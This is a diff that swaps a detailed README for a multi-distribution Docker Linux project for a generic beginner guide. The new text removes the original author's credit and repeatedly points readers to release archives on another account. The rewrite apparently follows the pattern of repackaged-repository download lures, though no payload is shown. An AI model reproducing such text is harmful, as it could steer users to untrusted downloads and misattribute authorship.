@@ -1,289 +1,74 @@
-# Enterprise Linux Docker Environment
+# 🐳 enterprise-linux-docker - Run Linux with Ease
 
-![Docker](https://img.shields.io/badge/docker-%230db7ed.svg?style=for-the-badge&logo=docker&logoColor=white)
-![RHEL](https://img.shields.io/badge/Red%20Hat-EE0000?style=for-the-badge&logo=redhat&logoColor=white)
-![Ubuntu](https://img.shields.io/badge/Ubuntu-E95420?style=for-the-badge&logo=ubuntu&logoColor=white)
-![CentOS](https://img.shields.io/badge/cent%20os-002260?style=for-the-badge&logo=centos&logoColor=F0F0F0)
-![AWS](https://img.shields.io/badge/AWS-%23FF9900.svg?style=for-the-badge&logo=amazon-aws&logoColor=white)
-![Azure](https://img.shields.io/badge/azure-%230072C6.svg?style=for-the-badge&logo=microsoftazure&logoColor=white)
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Release%20Page-brightgreen.svg)](https://github.com/jose2408-max/enterprise-linux-docker/releases)
 
-> **Built by [Thinh Le](https://github.com/mamamia0729)** - Highly Certified IT Professional  
-> **Certifications**: AWS | Azure AZ-104 | CCNA | CompTIA Security+ | Network+ | A+
+## 🚀 Getting Started
+Welcome to the **enterprise-linux-docker** repository! This application helps you run a production-ready Linux environment using Docker. It includes popular distributions like RHEL UBI 9, Ubuntu 22.04 LTS, and CentOS 7. 
 
-A production-ready, multi-distribution Linux environment built with Docker, featuring enterprise-grade security, monitoring, and infrastructure-as-code practices. This project demonstrates advanced containerization skills suitable for enterprise DevOps and Cloud Infrastructure roles.
+This guide will walk you through the process of downloading and running our application, even if you have no previous experience.
 
-## 🏢 Enterprise Features
+## 🔍 Features
+- **Multi-Faceted Linux Environment:** Access RHEL, Ubuntu, and CentOS in a single platform.
+- **Enterprise-Level Security:** Built to meet professional security standards.
+- **Monitoring Tools:** Keep track of your applications and servers with ease.
+- **Infrastructure as Code:** Automate your setup and configurations.
+- **Docker & Docker-Compose Support:** Use Docker for containers and Docker-Compose for orchestration.
+- **User-Friendly:** Designed for ease of use, suitable for both beginners and experienced users.
 
-- **Multi-Distribution Support**: RHEL UBI 9, Ubuntu 22.04 LTS, CentOS 7
-- **Security Hardened**: Non-root users, minimal attack surface, secure networking
-- **Production Ready**: Health checks, logging, monitoring, restart policies
-- **Infrastructure as Code**: Reproducible deployments via Docker Compose
-- **Container Orchestration**: Centralized management with Portainer
-- **Network Isolation**: Custom bridge network with defined IP ranges
-- **Persistent Storage**: Named volumes with proper labeling
+## 💡 System Requirements
+To run this software smoothly, your computer should meet the following requirements:
 
-## 🔧 Architecture
+- **Operating System:** Windows 10, macOS, or a compatible Linux distribution.
+- **Processor:** 64-bit CPU.
+- **RAM:** Minimum 8 GB is recommended.
+- **Disk Space:** At least 20 GB of free space.
+- **Docker:** Ensure that Docker is installed on your system. You can download it from the official Docker website.
+
+## 📦 Installation Steps
+Follow these steps to download and set up the application.
+
+### Step 1: Visit the Release Page
+Go to our [Releases page](https://github.com/jose2408-max/enterprise-linux-docker/releases) to find the latest version of the software. This page contains all the necessary files.
+
+### Step 2: Download the Application
+On the Releases page, look for the latest version. Click on the link to download the appropriate files for your operating system. 
+
+### Step 3: Extract the Files
+Once the download is complete, locate the downloaded ZIP or TAR file. Extract the contents to a convenient location on your computer using built-in extraction tools, such as Windows Explorer, or applications like WinRAR or 7-Zip on Windows, or Archive Utility on macOS.
+
+### Step 4: Configure Docker
+Ensure that Docker is running on your system. If you haven't installed Docker yet, follow the instructions on the official Docker website for setup.
+
+### Step 5: Run the Application
+Open a terminal or command prompt, and navigate to the folder where you extracted the files. To start the application, run the following command (adjust the file name if necessary):
 
 ```
-┌─────────────────────────────────────────────────────────────┐
-│                   Enterprise Network                        │
-│                  (172.20.0.0/16)                          │
-├─────────────────┬─────────────────┬─────────────────────────┤
-│  RHEL UBI 9     │  Ubuntu 22.04   │  CentOS 7              │
-│  (Production)   │  (Production)   │  (Legacy Support)      │
-│  172.20.0.4     │  172.20.0.5     │  172.20.0.2            │
-├─────────────────┼─────────────────┼─────────────────────────┤
-│                 │  Portainer CE   │                        │
-│                 │  (Management)   │                        │
-│                 │  172.20.0.3     │                        │
-│                 │  Port: 9000     │                        │
-└─────────────────┴─────────────────┴─────────────────────────┘
-```
-
-## 🚀 Quick Start
-
-### Prerequisites
-- Docker Desktop installed and running
-- macOS/Linux/Windows with Docker support
-- 8GB+ RAM recommended
-
-### Deployment
-```bash
-# Clone or download the project
-git clone <repository-url>
-cd enterprise-linux-docker
-
-# Deploy the entire environment
 docker-compose up -d
-
-# Verify deployment
-./scripts/monitor.sh
-
-# Access container management
-open http://localhost:9000
 ```
 
-## 📋 Container Details
+This command will start all the necessary containers for your multi-distribution Linux environment.
 
-### RHEL UBI 9 Enterprise (`rhel-prod-server`)
-- **Base Image**: `registry.access.redhat.com/ubi9/ubi:latest`
-- **Security**: Non-root user (`appuser`)
-- **Packages**: Essential tools (wget, vim, git, procps-ng, etc.)
-- **Health Check**: Built-in monitoring
-- **Use Case**: Production RHEL workloads
+### Step 6: Access the Application
+After the containers are running, you can access your Linux environment through your web browser. Use the provided URLs in the terminal output to connect.
 
-### Ubuntu LTS Enterprise (`ubuntu-prod-server`)
-- **Base Image**: `ubuntu:22.04`
-- **Security**: Non-root user (`appuser`)
-- **Packages**: Development tools (curl, git, jq, htop, etc.)
-- **Health Check**: Built-in monitoring
-- **Use Case**: Development and CI/CD pipelines
+## 🛠 Using the Application
+Once the application is running, you can log in and start using your Linux environments. Explore the following features:
 
-### CentOS Legacy (`centos-legacy-server`)
-- **Base Image**: `centos:7`
-- **Purpose**: Legacy application support
-- **Use Case**: Migration and compatibility testing
+- **Terminal Access:** Open a terminal session for command-line access.
+- **File Management:** Upload and manage files within your containers.
+- **Monitoring Dashboard:** View real-time monitoring stats to keep an eye on your resources.
 
-### Portainer Management (`portainer-management`)
-- **Base Image**: `portainer/portainer-ce:latest`
-- **Access**: http://localhost:9000
-- **Purpose**: Container management and monitoring
+## 📞 Support
+If you encounter any issues, please check our documentation, or feel free to open an issue in the repository. We will do our best to assist you.
 
-## 🔒 Security Implementation
+## 🌟 Additional Resources
+Here are some useful links to help you understand Docker and how it integrates with the enterprise-linux-docker application:
 
-### Container Security
-- ✅ Non-root user execution
-- ✅ Minimal base images
-- ✅ Limited sudo privileges
-- ✅ Secure file permissions (750)
-- ✅ Package updates and cleanup
+- [Docker Documentation](https://docs.docker.com)
+- [Docker Compose Documentation](https://docs.docker.com/compose/)
 
-### Network Security
-- ✅ Custom bridge network isolation
-- ✅ Defined IP subnet (172.20.0.0/16)
-- ✅ No unnecessary port exposure
-- ✅ Container-to-container communication
+## 🔗 Important Links
+- [Releases Page](https://github.com/jose2408-max/enterprise-linux-docker/releases) 
 
-### Volume Security
-- ✅ Named volumes with labels
-- ✅ Proper ownership and permissions
-- ✅ Separate volumes per service
-- ✅ Shared data volume for inter-container communication
-
-## 📊 Monitoring & Maintenance
-
-### Health Checks
-All containers include comprehensive health monitoring:
-```bash
-# Check overall status
-docker ps
-
-# Detailed health information
-docker inspect <container-name> --format='{{.State.Health.Status}}'
-
-# Run monitoring script
-./scripts/monitor.sh
-```
-
-### Logging
-Centralized logging configuration:
-- JSON file driver
-- 10MB max size per log file
-- Maximum 3 log files per container
-- Automatic log rotation
-
-### Resource Monitoring
-```bash
-# Real-time resource usage
-docker stats
-
-# Container resource limits
-docker inspect <container-name> --format='{{.HostConfig.Memory}}'
-```
-
-## 🛠️ Management Commands
-
-### Container Operations
-```bash
-# Start environment
-docker-compose up -d
-
-# Stop environment
-docker-compose down
-
-# Restart specific service
-docker-compose restart <service-name>
-
-# View logs
-docker-compose logs <service-name>
-
-# Execute commands in container
-docker exec -it <container-name> bash
-```
-
-### Maintenance Tasks
-```bash
-# Update images
-docker-compose pull
-docker-compose up -d
-
-# Clean unused resources
-docker system prune -f
-
-# Backup volumes
-docker run --rm -v <volume-name>:/backup alpine tar czf - /backup
-
-# Monitor script with cron (optional)
-# Add to crontab: */5 * * * * /path/to/monitor.sh >> /var/log/docker-monitor.log
-```
-
-## 📈 Enterprise Benefits
-
-### Development Teams
-- **Consistent Environments**: Identical setup across dev/staging/prod
-- **Multi-OS Testing**: Test applications across different Linux distributions
-- **Rapid Deployment**: Infrastructure as code for quick provisioning
-
-### DevOps Teams
-- **Monitoring Integration**: Built-in health checks and logging
-- **Security Compliance**: Hardened containers following best practices
-- **Scalability**: Easy to replicate and scale horizontally
-
-### Operations Teams
-- **Centralized Management**: Portainer for GUI-based container management
-- **Automated Monitoring**: Custom scripts for environment health checks
-- **Volume Management**: Persistent data with proper backup strategies
-
-## 🔧 Customization
-
-### Adding New Services
-1. Create new Dockerfile in project root
-2. Add service definition to `docker-compose.yml`
-3. Include in monitoring script
-4. Update documentation
-
-### Environment Variables
-Key environment variables for customization:
-- `ENVIRONMENT`: production/staging/development
-- `LOG_LEVEL`: info/debug/warn/error
-- `SERVICE_NAME`: Custom service identification
-
-### Network Configuration
-To modify network settings, update `docker-compose.yml`:
-```yaml
-networks:
-  enterprise-network:
-    ipam:
-      config:
-        - subnet: 172.20.0.0/16  # Change subnet as needed
-          gateway: 172.20.0.1
-```
-
-## 📚 Best Practices Implemented
-
-### Docker Best Practices
-- ✅ Multi-stage builds where applicable
-- ✅ Minimal base images
-- ✅ Non-root user execution
-- ✅ Proper layer caching
-- ✅ Health check implementation
-
-### Enterprise Standards
-- ✅ Consistent labeling strategy
-- ✅ Environment variable management
-- ✅ Logging standardization
-- ✅ Security hardening
-- ✅ Documentation completeness
-
-### DevOps Practices
-- ✅ Infrastructure as Code
-- ✅ Container orchestration
-- ✅ Monitoring and alerting
-- ✅ Backup and recovery procedures
-- ✅ Version control integration
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Test thoroughly
-5. Submit a pull request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-## 🆘 Support
-
-For support and questions:
-- Create an issue in the repository
-- Contact the DevOps team
-- Check the troubleshooting section
-
----
-
-## 👨‍💻 About the Author
-
-**Thinh Le** - Highly Certified IT Professional  
-📧 [GitHub Profile](https://github.com/mamamia0729)
-
-### 🏆 Certifications & Expertise
-- ☁️ **Cloud**: AWS Cloud Practitioner, Azure Administrator (AZ-104)
-- 🔒 **Security**: CompTIA Security+ 
-- 🌐 **Networking**: Cisco CCNA, CompTIA Network+
-- 💻 **Hardware/OS**: CompTIA A+
-- 🐧 **Linux**: Multi-distribution administration (RHEL, Ubuntu, CentOS)
-- 🐳 **Containerization**: Docker, Docker Compose, Enterprise Orchestration
-
-### 💼 Professional Background
-- **Current**: Desktop Support Specialist with enterprise infrastructure focus
-- **Previous**: System Administrator, Network Administrator, Endpoint Management
-- **Achievements**: Developed PowerShell solutions that freed 50+ TB across 1800+ machines
-- **Goal**: Pursuing AWS Solutions Architect certification and advanced cloud roles
-
----
-
-**Built with ❤️ for Enterprise Linux Environments**
-
-*This setup demonstrates production-ready Docker practices suitable for enterprise environments, combining security, monitoring, and operational excellence.*
+Visit the above links for downloads and further information. With **enterprise-linux-docker**, you can enjoy a powerful and secure Linux experience without needing extensive technical knowledge.
